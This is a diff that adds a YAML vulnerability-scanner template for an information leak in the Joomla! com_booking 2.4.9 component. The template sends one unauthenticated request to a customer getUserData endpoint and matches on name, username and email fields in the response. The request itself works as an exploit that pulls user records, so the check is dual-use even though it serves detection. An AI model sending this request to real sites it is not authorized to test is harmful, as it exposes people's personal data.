@@ -1,0 +1,31 @@
+id: joomla-com-booking-component
+brief:
+    title: Joomla! com_booking component 2.4.9 - Information Leak
+    by: r3Y3r53
+    level: high
+    about: Joomla! com_booking component suffers from Information leak vulnerability in which sensitive or confidential data is unintentionally exposed or made accessible to unauthorized individuals or systems.
+    label:
+        - joomla
+        - info-leak
+        - unauth
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/index.php?option=com_booking&controller=customer&task=getUserData&id=123'
+      signs:
+        - "on": word
+          has:
+            - '"name":'
+            - '"username":'
+            - '"email":'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
